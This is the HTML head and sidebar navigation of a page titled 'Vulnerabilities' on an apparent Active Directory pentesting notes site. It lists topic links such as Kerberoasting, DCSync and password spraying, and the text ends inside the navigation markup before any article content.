<!doctype html><html lang=en class=no-js> <head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="Active Directory, Azure AD, Windows security research"><meta name=author content=neutron><link href=https://neutronsec.com/active_directory/stacking_the_deck/bleeding_edge_vulns/ rel=canonical><link rel=icon href=../../../assets/favicon.png><meta name=generator content="mkdocs-1.3.1, mkdocs-material-8.4.4+insiders-4.23.1"><title>Vulnerabilities - neutronsec</title><link rel=stylesheet href=../../../assets/stylesheets/main.6148a559.min.css><link rel=stylesheet href=../../../assets/stylesheets/palette.cbb835fc.min.css><link rel=preconnect href=https://fonts.gstatic.com crossorigin><link rel=stylesheet href="https://fonts.googleapis.com/css?family=Inter:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback"><style>:root{--md-text-font:"Inter";--md-code-font:"Roboto Mono"}</style><link rel=stylesheet href=../../../stylesheets/extra.css><script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce((e,_)=>(e<<5)-e+_.charCodeAt(0),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script><meta property=og:type content=website><meta property=og:title content="Vulnerabilities - neutronsec"><meta property=og:description content="Active Directory, Azure AD, Windows security research"><meta property=og:image content=https://neutronsec.com/assets/images/social/active_directory/stacking_the_deck/bleeding_edge_vulns.png><meta property=og:image:type content=image/png><meta property=og:image:width content=1200><meta property=og:image:height content=630><meta content=https://neutronsec.com/active_directory/stacking_the_deck/bleeding_edge_vulns/ property=og:url><meta name=twitter:card content=summary_large_image><meta name=twitter:title content="Vulnerabilities - neutronsec"><meta name=twitter:description content="Active Directory, Azure AD, Windows security research"><meta name=twitter:image content=https://neutronsec.com/assets/images/social/active_directory/stacking_the_deck/bleeding_edge_vulns.png></head> <body dir=ltr data-md-color-scheme data-md-color-primary data-md-color-accent> <input class=md-toggle data-md-toggle=drawer type=checkbox id=__drawer autocomplete=off> <input class=md-toggle data-md-toggle=search type=checkbox id=__search autocomplete=off> <label class=md-overlay for=__drawer></label> <div data-md-component=skip> </div> <div data-md-component=announce> </div> <header class=md-header data-md-component=header> <nav class="md-header__inner md-grid" aria-label=Header> <a href=../../.. title=neutronsec class="md-header__button md-logo" aria-label=neutronsec data-md-component=logo> <img src=../../../assets/images/illustration.png alt=logo> </a> <label class="md-header__button md-icon" for=__drawer> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2Z"/></svg> </label> <div class=md-header__title data-md-component=header-title> <div class=md-header__ellipsis> <div class=md-header__topic> <span class=md-ellipsis> neutronsec </span> </div> <div class=md-header__topic data-md-component=header-topic> <span class=md-ellipsis> Vulnerabilities </span> </div> </div> </div> <form class=md-header__option data-md-component=palette> <input class=md-option data-md-color-media=(prefers-color-scheme) data-md-color-scheme data-md-color-primary data-md-color-accent aria-label="Switch to light mode" type=radio name=__palette id=__palette_0> <label class="md-header__button md-icon" title="Switch to light mode" for=__palette_1 hidden> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="m14.3 16-.7-2h-3.2l-.7 2H7.8L11 7h2l3.2 9h-1.9M20 8.69V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12 20 8.69m-9.15 3.96h2.3L12 9l-1.15 3.65Z"/></svg> </label> <input class=md-option data-md-color-media="(prefers-color-scheme: light)" data-md-color-scheme=default data-md-color-primary=indigo data-md-color-accent=indigo aria-label="Switch to dark mode" type=radio name=__palette id=__palette_1> <label class="md-header__button md-icon" title="Switch to dark mode" for=__palette_2 hidden> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M12 8a4 4 0 0 0-4 4 4 4 0 0 0 4 4 4 4 0 0 0 4-4 4 4 0 0 0-4-4m0 10a6 6 0 0 1-6-6 6 6 0 0 1 6-6 6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12 20 8.69Z"/></svg> </label> <input class=md-option data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme=slate data-md-color-primary=indigo data-md-color-accent=indigo aria-label="Switch to system preference" type=radio name=__palette id=__palette_2> <label class="md-header__button md-icon" title="Switch to system preference" for=__palette_0 hidden> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M12 18c-.89 0-1.74-.2-2.5-.55C11.56 16.5 13 14.42 13 12c0-2.42-1.44-4.5-3.5-5.45C10.26 6.2 11.11 6 12 6a6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12 20 8.69Z"/></svg> </label> </form> <script>var media,input,key,value,palette=__md_get("__palette");if(palette&&palette.color){"(prefers-color-scheme)"===palette.color.media&&(media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']"),palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent"));for([key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script> <label class="md-header__button md-icon" for=__search> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg> </label> <div class=md-search data-md-component=search role=dialog> <label class=md-search__overlay for=__search></label> <div class=md-search__inner role=search> <form class=md-search__form name=search> <input type=text class=md-search__input name=query aria-label=Search placeholder=Search autocapitalize=off autocorrect=off autocomplete=off spellcheck=false data-md-component=search-query required> <label class="md-search__icon md-icon" for=__search> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg> </label> <nav class=md-search__options aria-label=Search> <a href=javascript:void(0) class="md-search__icon md-icon" title=Share aria-label=Share data-clipboard data-clipboard-text data-md-component=search-share tabindex=-1> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7 0-.24-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9a3 3 0 0 0-3 3 3 3 0 0 0 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.15c-.05.21-.08.43-.08.66 0 1.61 1.31 2.91 2.92 2.91 1.61 0 2.92-1.3 2.92-2.91A2.92 2.92 0 0 0 18 16.08Z"/></svg> </a> <button type=reset class="md-search__icon md-icon" title=Clear aria-label=Clear tabindex=-1> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41Z"/></svg> </button> </nav> <div class=md-search__suggest data-md-component=search-suggest></div> </form> <div class=md-search__output> <div class=md-search__scrollwrap data-md-scrollfix> <div class=md-search-result data-md-component=search-result> <div class=md-search-result__meta> Initializing search </div> <ol class=md-search-result__list></ol> </div> </div> </div> </div> </div> </nav> </header> <div class=md-container data-md-component=container> <nav class=md-tabs aria-label=Tabs data-md-component=tabs> <div class="md-tabs__inner md-grid"> <ul class=md-tabs__list> <li class=md-tabs__item> <a href=../../.. class=md-tabs__link> Home </a> </li> <li class=md-tabs__item> <a href=../../../about/ class=md-tabs__link> About </a> </li> <li class=md-tabs__item> <a href=../../../blog/ class=md-tabs__link> Blog </a> </li> <li class=md-tabs__item> <a href=../../../docs/ class="md-tabs__link md-tabs__link--active"> Notes </a> </li> </ul> </div> </nav> <main class=md-main data-md-component=main> <div class="md-main__inner md-grid"> <div class="md-sidebar md-sidebar--primary" data-md-component=sidebar data-md-type=navigation> <div class=md-sidebar__scrollwrap> <div class=md-sidebar__inner> <nav class="md-nav md-nav--primary md-nav--lifted md-nav--integrated" aria-label=Navigation data-md-level=0> <label class=md-nav__title for=__drawer> <a href=../../.. title=neutronsec class="md-nav__button md-logo" aria-label=neutronsec data-md-component=logo> <img src=../../../assets/images/illustration.png alt=logo> </a> neutronsec </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../.. class=md-nav__link> <span class=md-ellipsis> Home </span> </a> </li> <li class=md-nav__item> <a href=../../../about/ class=md-nav__link> <span class=md-ellipsis> About </span> </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_3 type=checkbox id=__nav_3> <div class="md-nav__link md-nav__container"> <a href=../../../blog/ class="md-nav__link "> <span class=md-ellipsis> Blog </span> </a> <label class="md-nav__link " for=__nav_3> <span class="md-nav__icon md-icon"></span> </label> </div> <nav class=md-nav aria-label=Blog data-md-level=1> <label class=md-nav__title for=__nav_3> <span class="md-nav__icon md-icon"></span> Blog </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--section md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_3_2 type=checkbox id=__nav_3_2> <label class=md-nav__link for=__nav_3_2> <span class=md-ellipsis> Archive </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Archive data-md-level=2> <label class=md-nav__title for=__nav_3_2> <span class="md-nav__icon md-icon"></span> Archive </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../blog/archive/2022/ class=md-nav__link> <span class=md-ellipsis> 2022 </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--section md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_3_3 type=checkbox id=__nav_3_3> <label class=md-nav__link for=__nav_3_3> <span class=md-ellipsis> Categories </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Categories data-md-level=2> <label class=md-nav__title for=__nav_3_3> <span class="md-nav__icon md-icon"></span> Categories </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../blog/category/blog/ class=md-nav__link> <span class=md-ellipsis> Blog </span> </a> </li> <li class=md-nav__item> <a href=../../../blog/category/hackthebox/ class=md-nav__link> <span class=md-ellipsis> HackTheBox </span> </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--active md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_4 type=checkbox id=__nav_4 checked> <div class="md-nav__link md-nav__container"> <a href=../../../docs/ class="md-nav__link "> <span class=md-ellipsis> Notes </span> </a> <label class="md-nav__link " for=__nav_4> <span class="md-nav__icon md-icon"></span> </label> </div> <nav class=md-nav aria-label=Notes data-md-level=1> <label class=md-nav__title for=__nav_4> <span class="md-nav__icon md-icon"></span> Notes </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--section md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_4_2 type=checkbox id=__nav_4_2> <label class=md-nav__link for=__nav_4_2> <span class=md-ellipsis> Cheatsheets </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Cheatsheets data-md-level=2> <label class=md-nav__title for=__nav_4_2> <span class="md-nav__icon md-icon"></span> Cheatsheets </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_4_2_1 type=checkbox id=__nav_4_2_1> <label class=md-nav__link for=__nav_4_2_1> <span class=md-ellipsis> Pentesting / CTF </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Pentesting / CTF" data-md-level=3> <label class=md-nav__title for=__nav_4_2_1> <span class="md-nav__icon md-icon"></span> Pentesting / CTF </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_4_2_1_1 type=checkbox id=__nav_4_2_1_1> <label class=md-nav__link for=__nav_4_2_1_1> <span class=md-ellipsis> Active Directory </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Active Directory" data-md-level=4> <label class=md-nav__title for=__nav_4_2_1_1> <span class="md-nav__icon md-icon"></span> Active Directory </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../cheat_sheets/active_directory/cheatsheet_aid/ class=md-nav__link> <span class=md-ellipsis> Basics </span> </a> </li> <li class=md-nav__item> <a href=../../../cheat_sheets/active_directory/enumeration_and_attacks/ class=md-nav__link> <span class=md-ellipsis> Enumeration/Attacks </span> </a> </li> <li class=md-nav__item> <a href=../../../cheat_sheets/active_directory/exploitation/ class=md-nav__link> <span class=md-ellipsis> Exploitation </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_4_2_1_2 type=checkbox id=__nav_4_2_1_2> <label class=md-nav__link for=__nav_4_2_1_2> <span class=md-ellipsis> Privilege Escalation </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Privilege Escalation" data-md-level=4> <label class=md-nav__title for=__nav_4_2_1_2> <span class="md-nav__icon md-icon"></span> Privilege Escalation </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../cheat_sheets/privesc/linux/ class=md-nav__link> <span class=md-ellipsis> Linux </span> </a> </li> <li class=md-nav__item> <a href=../../../cheat_sheets/privesc/windows/ class=md-nav__link> <span class=md-ellipsis> Windows </span> </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=../../../cheat_sheets/cheatsheet-77/ class=md-nav__link> <span class=md-ellipsis> Commands </span> </a> </li> <li class=md-nav__item> <a href=../../../cheat_sheets/linux_shortcuts/ class=md-nav__link> <span class=md-ellipsis> Linux Shortcuts </span> </a> </li> <li class=md-nav__item> <a href=../../../cheat_sheets/windows/ class=md-nav__link> <span class=md-ellipsis> Windows </span> </a> </li> <li class=md-nav__item> <a href=../../../cheat_sheets/shells_payloads/ class=md-nav__link> <span class=md-ellipsis> Shells & Payloads </span> </a> </li> <li class=md-nav__item> <a href=../../../cheat_sheets/web_requests/ class=md-nav__link> <span class=md-ellipsis> Web requests </span> </a> </li> <li class=md-nav__item> <a href=../../../cheat_sheets/deobfuscation/ class=md-nav__link> <span class=md-ellipsis> (De)Obfuscation </span> </a> </li> <li class=md-nav__item> <a href=../../../cheat_sheets/brute_forcing/ class=md-nav__link> <span class=md-ellipsis> Brute Forcing </span> </a> </li> <li class=md-nav__item> <a href=../../../cheat_sheets/common_apps/ class=md-nav__link> <span class=md-ellipsis> Common Applications </span> </a> </li> <li class=md-nav__item> <a href=../../../cheat_sheets/web_attacks/ class=md-nav__link> <span class=md-ellipsis> Web Attacks </span> </a> </li> <li class=md-nav__item> <a href=../../../cheat_sheets/file_transfer/ class=md-nav__link> <span class=md-ellipsis> File Transfer </span> </a> </li> <li class=md-nav__item> <a href=../../../cheat_sheets/footprinting/ class=md-nav__link> <span class=md-ellipsis> Footprinting </span> </a> </li> <li class=md-nav__item> <a href=../../../cheat_sheets/cheatsheet_ptpf/ class=md-nav__link> <span class=md-ellipsis> Pivoting, Tunnel, Port Forwarding </span> </a> </li> <li class=md-nav__item> <a href=../../../cheat_sheets/info_gathering_web/ class=md-nav__link> <span class=md-ellipsis> Information Gathering - Web </span> </a> </li> <li class=md-nav__item> <a href=../../../cheat_sheets/msf/ class=md-nav__link> <span class=md-ellipsis> MSF </span> </a> </li> <li class=md-nav__item> <a href=../../../cheat_sheets/password_attacks/ class=md-nav__link> <span class=md-ellipsis> Password Attacks </span> </a> </li> <li class=md-nav__item> <a href=../../../cheat_sheets/attacking_common_services/ class=md-nav__link> <span class=md-ellipsis> Attacking Common Services </span> </a> </li> <li class=md-nav__item> <a href=../../../cheat_sheets/ffuf/ class=md-nav__link> <span class=md-ellipsis> FFUF </span> </a> </li> <li class=md-nav__item> <a href=../../../cheat_sheets/hydra/ class=md-nav__link> <span class=md-ellipsis> Hydra </span> </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_4_3 type=checkbox id=__nav_4_3 checked> <label class=md-nav__link for=__nav_4_3> <span class=md-ellipsis> Red Team </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Red Team" data-md-level=2> <label class=md-nav__title for=__nav_4_3> <span class="md-nav__icon md-icon"></span> Red Team </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--active md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_4_3_1 type=checkbox id=__nav_4_3_1 checked> <label class=md-nav__link for=__nav_4_3_1> <span class=md-ellipsis> Active Directory </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Active Directory" data-md-level=3> <label class=md-nav__title for=__nav_4_3_1> <span class="md-nav__icon md-icon"></span> Active Directory </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_4_3_1_1 type=checkbox id=__nav_4_3_1_1> <label class=md-nav__link for=__nav_4_3_1_1> <span class=md-ellipsis> Initial Enumeration </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Initial Enumeration" data-md-level=4> <label class=md-nav__title for=__nav_4_3_1_1> <span class="md-nav__icon md-icon"></span> Initial Enumeration </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../initial_enum/external_recon_enum_principles/ class=md-nav__link> <span class=md-ellipsis> External Recon </span> </a> </li> <li class=md-nav__item> <a href=../../initial_enum/init_enum_domain/ class=md-nav__link> <span class=md-ellipsis> Initial Enumeration of the Domain </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_4_3_1_2 type=checkbox id=__nav_4_3_1_2> <label class=md-nav__link for=__nav_4_3_1_2> <span class=md-ellipsis> Gaining a Foothold </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Gaining a Foothold" data-md-level=4> <label class=md-nav__title for=__nav_4_3_1_2> <span class="md-nav__icon md-icon"></span> Gaining a Foothold </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../foothold/llmnr_nbtns_poisonong_from_linux/ class=md-nav__link> <span class=md-ellipsis> LLMNR/NBT-NS Poisoning - Linux </span> </a> </li> <li class=md-nav__item> <a href=../../foothold/llmnr_nbtns_poisonong_from_windows/ class=md-nav__link> <span class=md-ellipsis> LLMNR/NBT-NS Poisoning - Windows </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_4_3_1_3 type=checkbox id=__nav_4_3_1_3> <label class=md-nav__link for=__nav_4_3_1_3> <span class=md-ellipsis> Hunting for a User </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Hunting for a User" data-md-level=4> <label class=md-nav__title for=__nav_4_3_1_3> <span class="md-nav__icon md-icon"></span> Hunting for a User </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../userhunting/enumerate_retrieve_pwdpol/ class=md-nav__link> <span class=md-ellipsis> Enumerating & Retrieving PwdPols </span> </a> </li> <li class=md-nav__item> <a href=../../userhunting/pwd_spraying_target_user_list/ class=md-nav__link> <span class=md-ellipsis> Pwd Spraying - Making a Targeted User List </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_4_3_1_4 type=checkbox id=__nav_4_3_1_4> <label class=md-nav__link for=__nav_4_3_1_4> <span class=md-ellipsis> PwSpray </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=PwSpray data-md-level=4> <label class=md-nav__title for=__nav_4_3_1_4> <span class="md-nav__icon md-icon"></span> PwSpray </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../spray_responsibility/internal_pwd_spray_from_linux/ class=md-nav__link> <span class=md-ellipsis> Internal Spraying - Linux </span> </a> </li> <li class=md-nav__item> <a href=../../spray_responsibility/internal_pwd_spray_from_windows/ class=md-nav__link> <span class=md-ellipsis> Internal Spraying - Windows </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_4_3_1_5 type=checkbox id=__nav_4_3_1_5> <label class=md-nav__link for=__nav_4_3_1_5> <span class=md-ellipsis> Post Foothold </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Post Foothold" data-md-level=4> <label class=md-nav__title for=__nav_4_3_1_5> <span class="md-nav__icon md-icon"></span> Post Foothold </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../deeper_down_the_rabbithole/enumerating_security_controls/ class=md-nav__link> <span class=md-ellipsis> Enumerating Security Controls </span> </a> </li> <li class=md-nav__item> <a href=../../deeper_down_the_rabbithole/credentialed_enumeration_from_linux/ class=md-nav__link> <span class=md-ellipsis> Credentialed Enumeration - Linux </span> </a> </li> <li class=md-nav__item> <a href=../../deeper_down_the_rabbithole/credentialed_enumeration_from_windows/ class=md-nav__link> <span class=md-ellipsis> Credentialed Enumeration - Windows </span> </a> </li> <li class=md-nav__item> <a href=../../deeper_down_the_rabbithole/living_off_the_land/ class=md-nav__link> <span class=md-ellipsis> Living Off The Land </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_4_3_1_6 type=checkbox id=__nav_4_3_1_6> <label class=md-nav__link for=__nav_4_3_1_6> <span class=md-ellipsis> Kerberoasting </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Kerberoasting data-md-level=4> <label class=md-nav__title for=__nav_4_3_1_6> <span class="md-nav__icon md-icon"></span> Kerberoasting </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../cooking_with_fire/kerberoasting_from_linux/ class=md-nav__link> <span class=md-ellipsis> Kerberoasting - Linux </span> </a> </li> <li class=md-nav__item> <a href=../../cooking_with_fire/kerberoasting_from_windows/ class=md-nav__link> <span class=md-ellipsis> Kerberoasting - Windows </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_4_3_1_7 type=checkbox id=__nav_4_3_1_7> <label class=md-nav__link for=__nav_4_3_1_7> <span class=md-ellipsis> ACLs </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=ACLs data-md-level=4> <label class=md-nav__title for=__nav_4_3_1_7> <span class="md-nav__icon md-icon"></span> ACLs </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../acls/acl_enumeration/ class=md-nav__link> <span class=md-ellipsis> ACL Enumeration </span> </a> </li> <li class=md-nav__item> <a href=../../acls/acl_abuse/ class=md-nav__link> <span class=md-ellipsis> ACL Abuse Tactics </span> </a> </li> <li class=md-nav__item> <a href=../../acls/dcsync/ class=md-nav__link> <span class=md-ellipsis> DCSync </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--active md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_4_3_1_8 type=checkbox id=__nav_4_3_1_8 checked> <label class=md-nav__link for=__nav_4_3_1_8> <span class=md-ellipsis> Privilege Escalation </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Privilege Escalation" data-md-level=4> <label class=md-nav__title for=__nav_4_3_1_8> <span class="md-nav__icon md-icon"></span> Privilege Escalation </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../privileged_access/ class=md-nav__link> <span class=md-ellipsis> Privileged Access </span> </a> </li> <li class=md-nav__item> <a href=../kerberos_double_hop/ class=md-nav__link> <span class=md-ellipsis> Kerberos Double Hop </span> </a> </li> <li class="md-nav__item md-nav__item--active"> <input class="md-nav__toggle md-toggle" data-md-toggle=toc type=checkbox id=__toc> <a href=./ class="md-nav__link md-nav__link--active"> <span class=md-ellipsis> Vulnerabilities </span> </a> </li> <li class=md-nav__item> <a href=../miscellaneous_misconfigurations/ class=md-nav__link> <span class=md-ellipsis> Misconfigurations </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_4_3_1_9 type=checkbox id=__nav_4_3_1_9> <label class=md-nav__link for=__nav_4_3_1_9> <span class=md-ellipsis> Domain Trusts </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Domain Trusts" data-md-level=4> <label class=md-nav__title for=__nav_4_3_1_9> <span class="md-nav__icon md-icon"></span> Domain Trusts </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../why_so_trusting/domain_trusts_primer/ class=md-nav__link> <span class=md-ellipsis> Domain Trusts Primer </span> </a> </li> <li class=md-nav__item> <a href=../../why_so_trusting/atk_dom_trust_child_parent_trust_from_win/ class=md-nav__link> <span class=md-ellipsis> Attacking Domain Trusts - Child -> Parent - from Windows </span> </a> </li> <li class=md-nav__item> <a href=../../why_so_trusting/atk_dom_trust_child_parent_trust_from_linux/ class=md-nav__link> <span class=md-ellipsis> Attacking Domain Trusts - Child -> Parent - from Linux </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_4_3_1_10 type=checkbox id=__nav_4_3_1_10> <label class=md-nav__link for=__nav_4_3_1_10> <span class=md-ellipsis> Cross-Forest Trust Abuse </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Cross-Forest Trust Abuse" data-md-level=4> <label class=md-nav__title for=__nav_4_3_1_10> <span class="md-nav__icon md-icon"></span> Cross-Forest Trust Abuse </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../cross_forest_trust/cross_forest_trust_abuse_from_win/ class=md-nav__link> <span class=md-ellipsis> Cross-Forest Trust Abuse - from Windows </span> </a> </li> <li class=md-nav__item> <a href=../../cross_forest_trust/cross_forest_trust_abuse_from_linux/ class=md-nav__link> <span class=md-ellipsis> Cross-Forest Trust Abuse - from Linux </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_4_3_1_11 type=checkbox id=__nav_4_3_1_11> <label class=md-nav__link for=__nav_4_3_1_11> <span class=md-ellipsis> Defensive Considerations </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Defensive Considerations" data-md-level=4> <label class=md-nav__title for=__nav_4_3_1_11> <span class="md-nav__icon md-icon"></span> Defensive Considerations </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../defensive_considerations/hardening_ad/ class=md-nav__link> <span class=md-ellipsis> Hardening Active Directory </span> </a> </li> <li class=md-nav__item> <a href=../../defensive_considerations/additional_auditing_techniques/ class=md-nav__link> <span class=md-ellipsis> Additional AD Auditing Techniques </span> </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_4_3_2 type=checkbox id=__nav_4_3_2> <label class=md-nav__link for=__nav_4_3_2> <span class=md-ellipsis> Footprinting </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Footprinting data-md-level=3> <label class=md-nav__title for=__nav_4_3_2> <span class="md-nav__icon md-icon"></span> Footprinting </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../footprinting/domain_information/ class=md-nav__link> <span class=md-ellipsis> Domain Information </span> </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_4_3_2_2 type=checkbox id=__nav_4_3_2_2> <label class=md-nav__link for=__nav_4_3_2_2> <span class=md-ellipsis> Host Based Enumeration </span> <span class="md-nav__icon 